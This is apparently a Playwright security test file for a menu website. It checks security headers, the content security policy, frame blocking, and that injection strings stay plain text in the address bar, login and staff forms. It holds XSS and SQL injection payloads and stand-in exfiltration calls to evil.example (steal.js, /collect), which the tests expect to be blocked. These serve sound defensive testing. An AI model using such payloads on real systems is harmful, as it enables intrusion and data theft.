// Step 9 (BRIEF 8): the preview server's security headers, the policy the browser enforces
// with them, and code typed into the address, the staff forms and the login handled as plain
// text. Search and the contact form have their own injection tests in catalog.spec.ts and
// contact.spec.ts, and live-stack.spec.ts repeats the staff form test against the real database.
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { securityHeaders } from '../hosting/headers';
import { expect, test, type Page } from './support/test';
import { FakeSupabase, staffLogin } from './support/fakeSupabase';

// The same values the preview server is started with (vite.config.ts, mode e2e).
const expectedHeaders = Object.fromEntries(
  Object.entries(
    securityHeaders({
      supabaseUrl: process.env.VITE_SUPABASE_URL ?? 'http://127.0.0.1:54321',
      https: false,
    }),
  ).map(([name, value]) => [name.toLowerCase(), value]),
);

const attacks = {
  html: '<img src=x onerror=alert(1)>',
  script: '<script>alert(1)</script>',
  sql: "'); DROP TABLE items; --",
  sqlOr: "' OR '1'='1",
};

/** Counts alert, confirm and prompt boxes, which injected code would open. */
function countDialogs(page: Page): () => number {
  let count = 0;
  page.on('dialog', (dialog) => {
    count += 1;
    void dialog.dismiss();
  });
  return () => count;
}

async function logIn(page: Page) {
  await page.goto('/admin');
  await page.getByLabel('Email').fill(staffLogin.email);
  await page.getByLabel('Password', { exact: true }).fill(staffLogin.password);
  await page.getByRole('button', { name: 'Log in' }).click();
}

test.describe('headers and policy (NFR-SEC-11)', () => {
  test.skip(({ isMobile }) => isMobile, 'Headers do not depend on the device');

  test('every page, script, style sheet and file carries the security headers', async ({
    request,
  }) => {
    const html = await (await request.get('/en/')).text();
    const assets = [...html.matchAll(/(?:src|href)="(\/assets\/[^"]+)"/g)].map(
      (match) => match[1] ?? '',
    );
    expect(assets.filter((path) => path.endsWith('.js')).length).toBeGreaterThan(0);
    expect(assets.filter((path) => path.endsWith('.css')).length).toBeGreaterThan(0);

    for (const path of [
      '/',
      '/en/',
      '/fil/',
      '/ko/privacy',
      '/en/terms',
      '/en/no-such-page',
      '/admin',
      '/admin/items/new',
      '/theme-init.js',
      '/manifest.webmanifest',
      '/favicon.svg',
      ...assets,
    ]) {
      const response = await request.get(path);
      expect(response.status(), path).toBe(200);
      expect(response.headers(), path).toMatchObject(expectedHeaders);
    }
  });

  test('injected inline code, outside scripts and outside requests are blocked', async ({
    page,
    cspViolations,
  }) => {
    let outsideRequests = 0;
    await page.route('https://evil.example/**', (route) => {
      outsideRequests += 1;
      return route.fulfill({ contentType: 'text/javascript', body: 'window.outsideRan = true;' });
    });
    await FakeSupabase.install(page);
    await page.goto('/en/');
    await expect(page.locator('.item-card').first()).toBeVisible();

    const result = await page.evaluate(async () => {
      const flags = window as unknown as Record<string, unknown>;
      const inline = document.createElement('script');
      inline.textContent = 'window.inlineRan = true;';
      document.head.append(inline);

      const outside = document.createElement('script');
      outside.src = 'https://evil.example/steal.js';
      const outsideDone = new Promise((resolve) => {
        outside.addEventListener('error', resolve);
        outside.addEventListener('load', resolve);
      });
      document.head.append(outside);
      await outsideDone;

      const styled = document.createElement('p');
      styled.setAttribute('style', 'color: rgb(1, 2, 3)');
      document.body.append(styled);
      const sheet = document.createElement('style');
      sheet.textContent = 'body { outline: 7px solid rgb(4, 5, 6); }';
      document.head.append(sheet);

      let fetched = true;
      try {
        await fetch('https://evil.example/collect');
      } catch {
        fetched = false;
      }
      return {
        inline: flags.inlineRan === true,
        outside: flags.outsideRan === true,
        color: getComputedStyle(styled).color,
        outline: getComputedStyle(document.body).outlineWidth,
        fetched,
      };
    });

    expect(result.inline).toBe(false);
    expect(result.outside).toBe(false);
    expect(result.color).not.toBe('rgb(1, 2, 3)');
    expect(result.outline).not.toBe('7px');
    expect(result.fetched).toBe(false);
    expect(outsideRequests).toBe(0);
    // The browser reported each one. They were on purpose, so the fixture's check is cleared.
    await expect
      .poll(() => cspViolations.map((violation) => violation.split(' ')[0]).sort())
      .toEqual([
        'connect-src',
        'script-src-elem',
        'script-src-elem',
        'style-src-attr',
        'style-src-elem',
      ]);
    cspViolations.length = 0;
  });

  test('another site cannot show the page in a frame', async ({ page }) => {
    // A second local server stands in for the other site. Its own page loads in a frame, so
    // only the site's headers can be what stops the site's page.
    const elsewhere = createServer((request, response) => {
      response.setHeader('Content-Type', 'text/html');
      response.end(
        request.url === '/own'
          ? '<!doctype html><title>Own page</title><p>Framed fine</p>'
          : '<!doctype html><title>Elsewhere</title>' +
              '<iframe id="site" src="http://127.0.0.1:4173/en/"></iframe>' +
              '<iframe id="own" src="/own"></iframe>',
      );
    });
    await new Promise<void>((resolve) => elsewhere.listen(0, '127.0.0.1', resolve));
    try {
      const { port } = elsewhere.address() as AddressInfo;
      await page.goto(`http://127.0.0.1:${String(port)}/`);
      await expect(page.frameLocator('#own').getByText('Framed fine')).toBeVisible();
      await expect
        .poll(() => page.frames().map((frame) => frame.url()))
        .toContain('chrome-error://chromewebdata/');
      await expect(page.frameLocator('#site').locator('#root')).toHaveCount(0);
    } finally {
      elsewhere.close();
    }
  });
});

test.describe('injection strings are plain text (BRIEF 8)', () => {
  test('in the address: a category or language made of code changes nothing', async ({ page }) => {
    await FakeSupabase.install(page);
    const dialogs = countDialogs(page);
    const supabaseRequests: string[] = [];
    page.on('request', (request) => {
      if (request.url().startsWith('http://127.0.0.1:54321/')) {
        supabaseRequests.push(decodeURIComponent(request.url()));
      }
    });
    for (const value of [attacks.script, attacks.html, attacks.sqlOr]) {
      await page.goto(`/en/?category=${encodeURIComponent(value)}`);
      // An unknown category shows the whole menu.
      await expect(page.getByRole('heading', { level: 4, name: 'Shin Ramyun' })).toBeVisible();
    }
    await page.goto(`/${encodeURIComponent(attacks.script)}/`);
    await expect(page).toHaveURL(/\/en\/$/);
    await expect(page.locator('main script, main img[src="x"]')).toHaveCount(0);
    expect(dialogs()).toBe(0);
    // The category is matched in the browser; nothing from the address reaches Supabase.
    expect(supabaseRequests.length).toBeGreaterThan(0);
    expect(
      supabaseRequests.filter((url) => Object.values(attacks).some((value) => url.includes(value))),
    ).toEqual([]);
  });

  test('in the staff login: a password made of code is only a wrong password', async ({ page }) => {
    await FakeSupabase.install(page);
    await page.goto('/admin');
    await page.getByLabel('Email').fill(staffLogin.email);
    await page.getByLabel('Password', { exact: true }).fill(`${attacks.sqlOr} --`);
    await page.getByRole('button', { name: 'Log in' }).click();
    await expect(page.getByRole('alert')).toHaveText('Wrong email or password');
  });

  test('in the staff item form: saved as typed and shown as text, in the panel and the menu', async ({
    context,
  }) => {
    const fake = await FakeSupabase.install(context);
    const page = await context.newPage();
    const dialogs = countDialogs(page);
    await logIn(page);
    await page.getByRole('link', { name: 'Add item' }).click();
    const english = page.getByRole('group', { name: 'English (required)' });
    await english.getByLabel('Name').fill(attacks.html);
    await english.getByLabel('Description').fill(`${attacks.script} ${attacks.sql}`);
    await page.getByRole('group', { name: 'Korean' }).getByLabel('Name').fill(attacks.sqlOr);
    await page.getByLabel('Category').selectOption({ label: 'Instant Noodles' });
    await page.getByLabel('Price in pesos').fill('10');
    await page.getByLabel('Show on the menu').check();
    await page.getByRole('button', { name: 'Save item' }).click();

    await expect(page.getByRole('status').filter({ hasText: 'Saved' })).toHaveText(
      `Saved ${attacks.html}.`,
    );
    expect(fake.item(attacks.html)).toMatchObject({
      description_en: `${attacks.script} ${attacks.sql}`,
      name_ko: attacks.sqlOr,
    });
    await expect(page.getByRole('link', { name: attacks.html })).toBeVisible();

    const visitor = await context.newPage();
    const visitorDialogs = countDialogs(visitor);
    await visitor.goto('/en/?category=instant-noodles');
    const card = visitor
      .getByRole('listitem')
      .filter({ has: visitor.getByRole('heading', { level: 4, name: attacks.html, exact: true }) });
    await expect(card).toContainText(`${attacks.script} ${attacks.sql}`);
    await visitor.goto('/ko/?category=instant-noodles');
    await expect(
      visitor.getByRole('heading', { level: 4, name: attacks.sqlOr, exact: true }),
    ).toBeVisible();
    for (const open of [page, visitor]) {
      await expect(open.locator('script:not([src]), img[src="x"]')).toHaveCount(0);
    }
    expect(dialogs() + visitorDialogs()).toBe(0);
  });

  test('in the staff category form: the name stays text and its web address name stays safe', async ({
    page,
  }) => {
    const fake = await FakeSupabase.install(page);
    const dialogs = countDialogs(page);
    await logIn(page);
    await page.getByRole('link', { name: 'Categories' }).click();
    await page.getByRole('button', { name: 'Add category' }).click();
    await page.getByLabel('Name in English (required)').fill(attacks.script);
    await expect(page.getByLabel('Web address name')).toHaveValue('script-alert-1-script');
    await page.getByRole('button', { name: 'Save category' }).click();
    await expect(page.getByRole('status').filter({ hasText: 'Saved' })).toHaveText(
      `Saved ${attacks.script}.`,
    );
    expect(fake.categories.find((category) => category.name_en === attacks.script)?.slug).toBe(
      'script-alert-1-script',
    );
    await expect(page.getByRole('button', { name: `Delete ${attacks.script}` })).toBeVisible();
    await expect(page.locator('script:not([src])')).toHaveCount(0);
    expect(dialogs()).toBe(0);
  });
});
